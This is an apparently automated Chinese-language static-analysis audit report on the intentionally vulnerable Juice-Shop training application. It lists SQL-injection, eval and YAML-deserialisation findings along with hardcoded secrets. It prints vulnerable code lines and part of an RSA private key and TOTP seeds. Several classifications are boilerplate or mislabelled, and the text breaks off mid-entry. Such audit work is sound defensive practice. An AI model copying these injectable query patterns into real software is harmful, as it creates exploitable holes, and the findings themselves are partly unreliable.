# Juice-Shop 安全审计报告

> 生成工具：AuditAgentX　生成时间：2026-07-09 09:39:05 UTC

## 1. 执行摘要

本次审计对象为 Juice-Shop，来源为 https://github.com/juice-shop/juice-shop，项目主要语言为 TypeScript、Solidity、JavaScript、Python、Shell，框架识别结果为 Express，共解析 663 个文件、102598 行代码。AuditAgentX 的流程先由 RepoParserAgent 建立项目画像，再由 StaticScanAgent 调用静态规则和 SAST 工具产生候选漏洞，AuditAgent 补充语义层面的风险发现，VerifyAgent 独立复核并过滤误报，随后 ExploitAgent/DynamicVerifier 对可验证漏洞生成授权 PoC 并保存运行证据，最后由 SummaryAgent 汇总为本报告。当前共发现 404 条风险，其中 Critical 0 条、High 227 条、Medium 73 条、Low 104 条；静态分析覆盖 404 条，动态验证覆盖 0 条，其中 0 条已复现。主要风险类型集中在 Hardcoded Secret(188)、SSRF(70)、XSS(29)、Weak Randomness(22)，总体风险评级为 HIGH。

**总体风险等级：HIGH**

### 1.1 项目概况总结

项目 Juice-Shop 来源于 https://github.com/juice-shop/juice-shop，主要语言为 TypeScript、Solidity、JavaScript、Python、Shell，框架为 Express，共 663 个文件、102598 行代码。

### 1.2 漏洞结果总结

本次共发现 404 条漏洞，其中 Critical 0 条、High 227 条、Medium 73 条、Low 104 条。

**静态分析总结：** 静态分析阶段合并 SAST 工具、硬编码密钥检测和自定义规则结果，共形成 404 条静态风险。主要来源分布为 custom-taint(357)、semgrep(47)。这些结果先作为候选项进入 VerifyAgent，避免仅凭规则命中直接下结论。

**动态验证总结：** 本次报告未发现已落库的动态运行证据。若需要展示漏洞利用效果，应启用 ExploitAgent 和动态验证配置，并在本地授权靶场执行。

### 1.3 多智能体工作流


1. RepoParserAgent：解析仓库结构、语言、框架、入口文件、依赖与代码规模，为后续审计提供项目画像。

2. StaticScanAgent：调用 Semgrep、Gitleaks、自定义规则等工具进行静态扫描，产出 SQL 注入、命令注入、路径遍历、硬编码密钥等候选风险。

3. AuditAgent：基于 LLM 对代码上下文做语义审计，补充传统 SAST 工具可能漏掉的业务逻辑与调用链风险。

4. VerifyAgent：独立复核候选漏洞，调用本地代码上下文读取、启发式分析和 SAST replay 工具过滤误报。

5. ExploitAgent / DynamicVerifier：为已确认漏洞生成授权 PoC、触发路径和利用代码，并在本地靶场或授权目标上保存动态验证证据。

6. SummaryAgent：汇总项目概况、静态/动态结果、证据链和修复优先级，生成执行摘要与修改建议。


### 1.4 SummaryAgent 修改建议

| 优先级 | 建议 | 说明 |
|---|---|---|
| P0 | 优先修复 Critical/High 漏洞 | 先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。 |
| P1 | 按漏洞类型批量治理 | 对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。 |
| P1 | 补充动态验证覆盖 | 为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。 |
| P2 | 纳入持续审计流程 | 将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。 |


## 2. 项目概况

| 项 | 值 |
|---|---|
| 项目名称 | Juice-Shop |
| 来源 | https://github.com/juice-shop/juice-shop |
| 语言 | TypeScript, Solidity, JavaScript, Python, Shell |
| 框架 | Express |
| 文件数 | 663 |
| 代码行数 | 102598 |
| 扫描任务 | scan_b669bb58（full / done） |

## 3. 漏洞统计

| 严重级 | 数量 |
|---|---|
| Critical | 0 |
| High | 227 |
| Medium | 73 |
| Low | 104 |
| **合计** | **404** |

## 4. 漏洞明细


### 4.1 run-shell-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www-legacy.yml:36`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.2 run-shell-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:27`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.3 run-shell-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:36`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.4 express-sequelize-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_1.ts:5`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.5 express-sequelize-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_3.ts:11`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.6 express-sequelize-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\unionSqlInjectionChallenge_1.ts:6`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.7 express-sequelize-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\unionSqlInjectionChallenge_3.ts:10`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.8 detected-generic-secret（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\users.yml:151`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.9 detected-jwt-token（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\app\app.guard.spec.ts:46`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.10 detected-jwt-token（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\app\last-login-ip\last-login-ip.component.spec.ts:72`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.11 detected-jwt-token（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\app\last-login-ip\last-login-ip.component.spec.ts:78`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.12 remote-property-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\currentUser.ts:31`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.13 express-sequelize-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\login.ts:34`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.14 express-sequelize-injection（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\search.ts:23`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.15 code-string-concat（HIGH）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\userProfile.ts:61`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.16 Insecure Deserialization（HIGH）

- 文件：`server.ts:139`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const swaggerDocument = yaml.load(fs.readFileSync('./swagger.yml', 'utf8'))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.17 SQL Injection（HIGH）

- 文件：`data/static/codefixes/dbSchemaChallenge_1.ts:5`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query("SELECT * FROM Products WHERE ((name LIKE '%"+criteria+"%' OR description LIKE '%"+criteria+"%') AND deletedAt IS NULL) ORDER BY name")
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.18 SQL Injection（HIGH）

- 文件：`data/static/codefixes/dbSchemaChallenge_3.ts:11`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.19 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginAdminChallenge_1.ts:18`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.20 Hardcoded Secret（HIGH）

- 文件：`data/static/codefixes/loginAdminChallenge_1.ts:18`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.21 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginAdminChallenge_2.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.22 Hardcoded Secret（HIGH）

- 文件：`data/static/codefixes/loginAdminChallenge_2.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.23 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginAdminChallenge_3.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.24 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginAdminChallenge_4_correct.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.25 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginBenderChallenge_1.ts:18`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.26 Hardcoded Secret（HIGH）

- 文件：`data/static/codefixes/loginBenderChallenge_1.ts:18`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.27 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginBenderChallenge_2_correct.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = $mail AND password = $pass AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.28 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginBenderChallenge_3.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.29 Hardcoded Secret（HIGH）

- 文件：`data/static/codefixes/loginBenderChallenge_3.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.30 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginBenderChallenge_4.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: fals
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.31 Hardcoded Secret（HIGH）

- 文件：`data/static/codefixes/loginBenderChallenge_4.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: fals
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.32 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginJimChallenge_1_correct.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.33 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginJimChallenge_2.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: fals
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.34 Hardcoded Secret（HIGH）

- 文件：`data/static/codefixes/loginJimChallenge_2.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: fals
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.35 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginJimChallenge_3.ts:15`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL`,
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.36 SQL Injection（HIGH）

- 文件：`data/static/codefixes/loginJimChallenge_4.ts:18`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.37 Hardcoded Secret（HIGH）

- 文件：`data/static/codefixes/loginJimChallenge_4.ts:18`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.38 SQL Injection（HIGH）

- 文件：`data/static/codefixes/unionSqlInjectionChallenge_1.ts:6`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.39 SQL Injection（HIGH）

- 文件：`data/static/codefixes/unionSqlInjectionChallenge_3.ts:10`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.40 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/payment/payment.component.spec.ts:351`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
userService.upgradeToDeluxe.mockReturnValue(of({ token: 'tokenValue' }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.41 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/register/register.component.spec.ts:155`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const user = { email: 'x@x.xx', password: 'password', passwordRepeat: 'password', securityQuestion: { id: 1, question: 'Wat is?' }, securityAnswer: 'Answer' }
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.42 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/Services/keys.service.spec.ts:68`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
expect(req.request.body).toEqual({ privateKey: 'privateKey' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.43 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/Services/two-factor-auth-service.spec.ts:36`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
expect(req.request.body).toEqual({ tmpToken: '000000', totpToken: '123456' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.44 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/Services/two-factor-auth-service.spec.ts:68`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
expect(req.request.body).toEqual({ password: 's3cr3t!', initialToken: 'initialToken', setupToken: 'setupToken' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.45 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/Services/two-factor-auth-service.spec.ts:84`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
expect(req.request.body).toEqual({ password: 's3cr3t!' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.46 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:95`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
twoFactorAuthService.status.mockReturnValue(of({ setup: false, email: 'email', secret: 'secret', setupToken: '12345' }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.47 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:106`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
twoFactorAuthService.status.mockReturnValue(of({ setup: true, email: 'email', secret: 'secret', setupToken: '12345' }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.48 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:145`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
twoFactorAuthService.status.mockReturnValue(of({ setup: true, email: 'email', secret: 'secret', setupToken: '12345' }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.49 Hardcoded Secret（HIGH）

- 文件：`frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:243`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
twoFactorAuthService.status.mockReturnValue(of({ setup: false, email: 'e', secret: 'super-secret', setupToken: 't' }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.50 Hardcoded Secret（HIGH）

- 文件：`lib/insecurity.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.51 Insecure Deserialization（HIGH）

- 文件：`lib/scripts/lintConfig.ts:22`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
configuration = yaml.load(await readFile(file, 'utf8'))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.52 Command Injection（HIGH）

- 文件：`routes/captcha.ts:22`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const answer = eval(expression).toString() // eslint-disable-line no-eval
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.53 Insecure Deserialization（HIGH）

- 文件：`routes/fileUpload.ts:109`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const yamlString = vm.runInContext('JSON.stringify(yaml.load(data))', sandbox, { timeout: 2000 })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.54 SQL Injection（HIGH）

- 文件：`routes/login.ts:34`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.55 Hardcoded Secret（HIGH）

- 文件：`routes/login.ts:34`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.56 Insecure Deserialization（HIGH）

- 文件：`routes/vulnCodeFixes.ts:81`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const codingChallengeInfos = yaml.load(fs.readFileSync('./data/static/codefixes/' + key + '.info.yml', 'utf8'))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.57 Insecure Deserialization（HIGH）

- 文件：`routes/vulnCodeSnippet.ts:90`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const codingChallengeInfos = yaml.load(await fs.readFile('./data/static/codefixes/' + key + '.info.yml', { encoding: 'utf8' }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.58 Insecure Deserialization（HIGH）

- 文件：`rsn/rsnUtil.ts:135`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return yaml.load(content) as ChallengeInfo
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.59 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:42`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpToken = generateSync({ secret: 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.60 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:66`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpToken = generateSync({ secret: 'BI6KJAURX3LL5VQI2ZBFVLUWSBYBDX4H' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.61 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:85`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpToken = generateSync({ secret: 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.62 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:104`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpToken = generateSync({ secret: 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.63 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:123`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const totpToken = generateSync({ secret: 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.64 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:141`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'EinBelegtesBrotMitSchinkenSCHINKEN!',
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.65 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:142`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
totpSecret: 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.66 Hardcoded Secret（HIGH）

- 文件：`test/api/2fa.test.ts:156`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
